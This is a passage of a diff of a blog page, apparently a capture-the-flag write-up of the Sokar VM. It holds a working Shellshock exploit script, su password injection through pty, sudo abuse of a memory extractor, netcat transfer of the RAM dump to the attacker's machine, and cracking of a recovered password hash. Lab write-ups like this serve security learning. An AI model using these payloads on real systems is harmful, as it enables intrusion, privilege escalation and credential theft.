+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python shock.py <span style=color:#e6db74>&#34;/usr/bin/id bynarr&#34;</span>
  * Executing /usr/bin/id bynarr
 
-<span style="color:#eedd82">uid</span>=500(bynarr) <span style="color:#eedd82">gid</span>=501(bynarr) <span style="color:#eedd82">groups</span>=501(bynarr),500(forensic)
+uid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span>,500<span style=color:#f92672>(</span>forensic<span style=color:#f92672>)</span>
 </code></pre></div><p>What confused me here was the mention of <em>&ldquo;outbound ephemeral port access on 51242&rdquo;</em>. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new <code>tcpdump</code> session and waited anxiously. <code>tcp/51242</code> outbound still appeared to be closed.</p>
 <p>Of course, the most valuable piece of information was definitely the password <em>fruity</em>. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.</p>
 <p>Essentially, the easiest way for me to become <code>bynarr</code> (assuming <em>fruity</em> really is the password), would be to <code>su</code> right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where <code>su</code> expects a password via <code>stdin</code>, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can&rsquo;t). Quite some time later, I got closer to becoming <code>bynarr</code> with something like <code>echo fruity | su bynarr</code>. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though <code>$(which id)</code> came in very handy and saved some time. In retrospect, I could have probably just exported <code>PATH</code> as required, but heh.</p>
-<p>Fast forward some time, I came across <a href="http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells">this</a> SANS blogpost, which details on the topic of some &lsquo;stealthy&rsquo; su shells. Most importantly, the example of <code>(sleep 1; echo password) | python -c &quot;import pty; pty.spawn(['/bin/su','-c','whoami']);&quot;</code> got me the closest to <code>bynarr</code>. Toying around with this a little, I realized that for some reason, the <code>(</code> and <code>)</code> characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:</p>
-<p><code>/usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);&quot;</code></p>
+<p>Fast forward some time, I came across <a href=http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells>this</a> SANS blogpost, which details on the topic of some &lsquo;stealthy&rsquo; su shells. Most importantly, the example of <code>(sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"</code> got me the closest to <code>bynarr</code>. Toying around with this a little, I realized that for some reason, the <code>(</code> and <code>)</code> characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:</p>
+<p><code>/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"</code></p>
 <p>(Basically, spawn a tty; attempt to <code>su</code> specifying the command to run with <code>-c</code>, then 1 second later, echo <code>fruity</code> to the <em>Password</em> prompt and execute <code>id</code> as <code>bynarr</code>)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python shock.py <span style="color:#87ceeb">&#34;/usr/bin/python -c \&#34;import time; time.sleep(1); print &#39;fruity&#39;\&#34; | /usr/bin/python -c \&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);\&#34;&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python shock.py <span style=color:#e6db74>&#34;/usr/bin/python -c \&#34;import time; time.sleep(1); print &#39;fruity&#39;\&#34; | /usr/bin/python -c \&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);\&#34;&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&#34;</span>
 
 Password:
-<span style="color:#eedd82">uid</span>=500(bynarr) <span style="color:#eedd82">gid</span>=501(bynarr) <span style="color:#eedd82">groups</span>=501(bynarr),500(forensic)
+uid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span>,500<span style=color:#f92672>(</span>forensic<span style=color:#f92672>)</span>
 </code></pre></div><p>:D As this is actually a Shellshock request, the full <code>User-Agent</code> header therefore was:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">() { :;};echo;/usr/bin/python -c &#34;import time; time.sleep(1); print &#39;fruity&#39;&#34; | /usr/bin/python -c &#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&#34;
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>() { :;};echo;/usr/bin/python -c &#34;import time; time.sleep(1); print &#39;fruity&#39;&#34; | /usr/bin/python -c &#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&#34;
 </code></pre></div><p>Again, constructing that every time I want to execute something as <code>bynarr</code> would have been le-suck, so I made another wrapper script:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0">#!/usr/bin/python</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
-<span style="color:#0f0"># Sokar &#39;bynarr&#39; command execution</span>
-<span style="color:#0f0"># 2015 Leon Jacobs</span>
+<span style=color:#75715e># Sokar &#39;bynarr&#39; command execution</span>
+<span style=color:#75715e># 2015 Leon Jacobs</span>
 
-<span style="color:#f00">import</span> requests
-<span style="color:#f00">import</span> sys
+<span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> sys
 
-<span style="color:#f00">if</span> len(sys.argv) &lt; <span style="color:#f60">2</span>:
+<span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
 
-    print <span style="color:#87ceeb">&#34; * Usage </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb"> &lt;cmd&gt;&#34;</span> % sys.argv[<span style="color:#f60">0</span>]
-    sys.exit(<span style="color:#f60">1</span>)
+    print <span style=color:#e6db74>&#34; * Usage </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> &lt;cmd&gt;&#34;</span> <span style=color:#f92672>%</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>]
+    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
 
-command = sys.argv[<span style="color:#f60">1</span>].strip()
-payload = <span style="color:#87ceeb">&#34;&#34;&#34;/usr/bin/python -c &#34;import time; time.sleep(1); print &#39;fruity&#39;&#34; | /usr/bin/python -c &#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39;, &#39;bynarr&#39;]);&#34; &#34;&#34;&#34;</span> % command
-print <span style="color:#87ceeb">&#34; * Executing </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span> % payload
+command <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip()
+payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;/usr/bin/python -c &#34;import time; time.sleep(1); print &#39;fruity&#39;&#34; | /usr/bin/python -c &#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;, &#39;bynarr&#39;]);&#34; &#34;&#34;&#34;</span> <span style=color:#f92672>%</span> command
+print <span style=color:#e6db74>&#34; * Executing </span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> payload
 
-<span style="color:#0f0"># prepare the sploit header</span>
-headers = { <span style="color:#87ceeb">&#34;User-Agent&#34;</span>: <span style="color:#87ceeb">&#34;() { :;};echo;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % payload }
-print requests.get(<span style="color:#87ceeb">&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers=headers).text.strip()
+<span style=color:#75715e># prepare the sploit header</span>
+headers <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;() { :;};echo;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> payload }
+print requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers<span style=color:#f92672>=</span>headers)<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>strip()
 </code></pre></div><p>All I have to do to get the output of <code>id</code> is provide it as a argument to <code>bynarr.py</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python bynarr.py <span style="color:#87ceeb">&#34;id&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python bynarr.py <span style=color:#e6db74>&#34;id&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&#34;</span>
 
 Password:
-<span style="color:#eedd82">uid</span>=500(bynarr) <span style="color:#eedd82">gid</span>=501(bynarr) <span style="color:#eedd82">groups</span>=501(bynarr),500(forensic)
-</code></pre></div><h2 id="the-scary-linux-memory-extractor">the scary linux memory extractor</h2>
+uid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span>,500<span style=color:#f92672>(</span>forensic<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=the-scary-linux-memory-extractor>the scary linux memory extractor</h2>
 <p>With command access as <code>bynarr</code> and remembering the mention of <code>tcp/51242</code> outbound connectivity, I once more try and run the port scanner that got copied to <code>/tmp</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python bynarr.py <span style="color:#87ceeb">&#34;/usr/bin/python /tmp/port_scan.py&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;/usr/bin/python /tmp/port_scan.py&#39;, &#39;bynarr&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python bynarr.py <span style=color:#e6db74>&#34;/usr/bin/python /tmp/port_scan.py&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;/usr/bin/python /tmp/port_scan.py&#39;, &#39;bynarr&#39;]);&#34;</span>
 
 Password:
-Trying port <span style="color:#f60">51240</span>
-Trying port <span style="color:#f60">51241</span>
-Trying port <span style="color:#f60">51242</span>
-Trying port <span style="color:#f60">51243</span>
-Trying port <span style="color:#f60">51244</span>
-Trying port <span style="color:#f60">51245</span>
-Trying port <span style="color:#f60">51246</span>
-Trying port <span style="color:#f60">51247</span>
-Trying port <span style="color:#f60">51248</span>
-Trying port <span style="color:#f60">51249</span>
-</code></pre></div><p>Checking the <code>tcpdump</code> output of this run&hellip;:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
+Trying port <span style=color:#ae81ff>51240</span>
+Trying port <span style=color:#ae81ff>51241</span>
+Trying port <span style=color:#ae81ff>51242</span>
+Trying port <span style=color:#ae81ff>51243</span>
+Trying port <span style=color:#ae81ff>51244</span>
+Trying port <span style=color:#ae81ff>51245</span>
+Trying port <span style=color:#ae81ff>51246</span>
+Trying port <span style=color:#ae81ff>51247</span>
+Trying port <span style=color:#ae81ff>51248</span>
+Trying port <span style=color:#ae81ff>51249</span>
+</code></pre></div><p>Checking the <code>tcpdump</code> output of this run&mldr;:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
 07:33:43.178113 IP 192.168.217.163.40371 &gt; 192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0
 07:33:43.178129 IP 192.168.217.174.51242 &gt; 192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0
-</code></pre></div><p>&hellip; I finally see something coming out of Sokar!
+</code></pre></div><p>&mldr; I finally see something coming out of Sokar!
 So <code>bynarr</code> is able to talk out on <code>tcp/51242</code>. Wut. Taking a few moments to think about this, I remembered that <code>iptables</code> is able to filter by user id using the <code>owner</code> module. At this stage, this was the only thing that made sense why <code>apache</code> would not be able to talk out on this port, but <code>bynarr</code> can.</p>
 <p>So with that out the way, it was time to focus on this <code>lime</code> thing. <code>bynarr</code> was allowed to run <code>/home/bynarr/lime</code> as root via <code>sudo</code> without a password (as I suspected for the <code>insmod</code>):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python bynarr.py <span style="color:#87ceeb">&#34;sudo -l&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;sudo -l&#39;, &#39;bynarr&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python bynarr.py <span style=color:#e6db74>&#34;sudo -l&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;sudo -l&#39;, &#39;bynarr&#39;]);&#34;</span>
 
 Password:
-Matching Defaults entries <span style="color:#f00">for</span> bynarr on this host:
-    !requiretty, visiblepw, always_set_home, env_reset, <span style="color:#eedd82">env_keep</span>=<span style="color:#87ceeb">&#34;COLORS
-</span><span style="color:#87ceeb">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&#34;</span>, <span style="color:#eedd82">env_keep</span>+=<span style="color:#87ceeb">&#34;MAIL PS1
-</span><span style="color:#87ceeb">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, <span style="color:#eedd82">env_keep</span>+=<span style="color:#87ceeb">&#34;LC_COLLATE
-</span><span style="color:#87ceeb">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, <span style="color:#eedd82">env_keep</span>+=<span style="color:#87ceeb">&#34;LC_MONETARY
-</span><span style="color:#87ceeb">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, <span style="color:#eedd82">env_keep</span>+=<span style="color:#87ceeb">&#34;LC_TIME LC_ALL
-</span><span style="color:#87ceeb">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
-    <span style="color:#eedd82">secure_path</span>=/sbin<span style="color:#87ceeb">\:</span>/bin<span style="color:#87ceeb">\:</span>/usr/sbin<span style="color:#87ceeb">\:</span>/usr/bin
+Matching Defaults entries <span style=color:#66d9ef>for</span> bynarr on this host:
+    !requiretty, visiblepw, always_set_home, env_reset, env_keep<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;COLORS
+</span><span style=color:#e6db74>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;MAIL PS1
+</span><span style=color:#e6db74>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_COLLATE
+</span><span style=color:#e6db74>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_MONETARY
+</span><span style=color:#e6db74>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_TIME LC_ALL
+</span><span style=color:#e6db74>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
+    secure_path<span style=color:#f92672>=</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin
 
 User bynarr may run the following commands on this host:
-    (ALL) NOPASSWD: /home/bynarr/lime
-</code></pre></div><p>I had no freaking idea what <code>lime</code> even really is, so, to the Gooooogles I went and came across this: <a href="https://github.com/504ensicsLabs/LiME">https://github.com/504ensicsLabs/LiME</a>. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p</p>
+    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /home/bynarr/lime
+</code></pre></div><p>I had no freaking idea what <code>lime</code> even really is, so, to the Gooooogles I went and came across this: <a href=https://github.com/504ensicsLabs/LiME>https://github.com/504ensicsLabs/LiME</a>. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p</p>
 <p>I ran the script to <code>insmod</code> the <code>lime.ko</code>, this time with <code>sudo</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python bynarr.py <span style="color:#87ceeb">&#34;echo \&#34;add\&#34; | sudo /home/bynarr/lime&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;echo &#34;</span>add<span style="color:#87ceeb">&#34; | sudo /home/bynarr/lime&#39;, &#39;bynarr&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python bynarr.py <span style=color:#e6db74>&#34;echo \&#34;add\&#34; | sudo /home/bynarr/lime&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;echo &#34;</span>add<span style=color:#e6db74>&#34; | sudo /home/bynarr/lime&#39;, &#39;bynarr&#39;]);&#34;</span>
 
 Password:
 
-==========================
-Linux Memory <span style="color:#eedd82">Extractorator</span>
-==========================
+<span style=color:#f92672>==========================</span>
+Linux Memory Extractorator
+<span style=color:#f92672>==========================</span>
 
 LKM, add or remove?
 &gt;
 
 </code></pre></div><p>I checked <code>/tmp</code> for the existence of the <code>ram</code> file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.</p>
-<p>Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local <code>ram</code> file with <code>nc -lvp 51242 &gt; ram</code>. Then, using my wrapper script <code>bynarr.py</code> again, I redirected the <code>/tmp/ram</code> file out over the netcat connection with: <code>python bynarr.py &quot;/usr/bin/nc 192.168.217.174 51242 &lt; /tmp/ram&quot;</code>. I now had a memory dump of Sokar on my local Kali Linux.</p>
-<p>It was at this stage that I went down the wrong rabbit hole. <a href="https://code.google.com/p/volatility/">Volatility</a> was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &lsquo;ol <code>strings</code>.</p>
+<p>Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local <code>ram</code> file with <code>nc -lvp 51242 > ram</code>. Then, using my wrapper script <code>bynarr.py</code> again, I redirected the <code>/tmp/ram</code> file out over the netcat connection with: <code>python bynarr.py "/usr/bin/nc 192.168.217.174 51242 &lt; /tmp/ram"</code>. I now had a memory dump of Sokar on my local Kali Linux.</p>
+<p>It was at this stage that I went down the wrong rabbit hole. <a href=https://code.google.com/p/volatility/>Volatility</a> was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &lsquo;ol <code>strings</code>.</p>
 <p>I had to think a bit about what could possibly be useful in memory for me now. I noticed the user <code>apophis</code> had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ strings ram | grep apophis
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ strings ram | grep apophis
 
-[... snip ...]
+<span style=color:#f92672>[</span>... snip ...<span style=color:#f92672>]</span>
 
-apophis:[snip]0HQCZwUJ<span style="color:#eedd82">$rYYSk9SeqtbKv3aEe3kz</span>/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
-</code></pre></div><p>&hellip; <strong>wut</strong>. Why&hellip; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&hellip; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through <code>john</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt
-Warning: detected hash type <span style="color:#87ceeb">&#34;sha512crypt&#34;</span>, but the string is also recognized as <span style="color:#87ceeb">&#34;crypt&#34;</span>
-Use the <span style="color:#87ceeb">&#34;--format=crypt&#34;</span> option to force loading these as that type instead
-Loaded <span style="color:#f60">1</span> password hash (sha512crypt [32/32])
-overdrive        (apophis)
-guesses: <span style="color:#f60">1</span>  time: 0:00:01:51 DONE (Sat Jan <span style="color:#f60">31</span> 20:35:42 2015)  c/s: <span style="color:#f60">327</span>  trying: parati - nicole28
-Use the <span style="color:#87ceeb">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+apophis:<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
+</code></pre></div><p>&mldr; <strong>wut</strong>. Why&mldr; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&mldr; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through <code>john</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ john passwd --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt
+Warning: detected hash type <span style=color:#e6db74>&#34;sha512crypt&#34;</span>, but the string is also recognized as <span style=color:#e6db74>&#34;crypt&#34;</span>
+Use the <span style=color:#e6db74>&#34;--format=crypt&#34;</span> option to force loading these as that type instead
+Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>sha512crypt <span style=color:#f92672>[</span>32/32<span style=color:#f92672>])</span>
+overdrive        <span style=color:#f92672>(</span>apophis<span style=color:#f92672>)</span>
+guesses: <span style=color:#ae81ff>1</span>  time: 0:00:01:51 DONE <span style=color:#f92672>(</span>Sat Jan <span style=color:#ae81ff>31</span> 20:35:42 2015<span style=color:#f92672>)</span>  c/s: <span style=color:#ae81ff>327</span>  trying: parati - nicole28
+Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
 </code></pre></div><p><code>apophis:overdrive</code>.</p>
-<h2 id="build-the-clone-to-the-hook">build the clone to the hook</h2>
+<h2 id=build-the-clone-to-the-hook>build the clone to the hook</h2>
 <p>To get command execution as <code>apophis.py</code> I copied the <code>bynarr.py</code> script to make <code>apophis.py</code>, changing the username and the password.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;id&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;id&#39;, &#39;apophis&#39;]);&#34;</span>
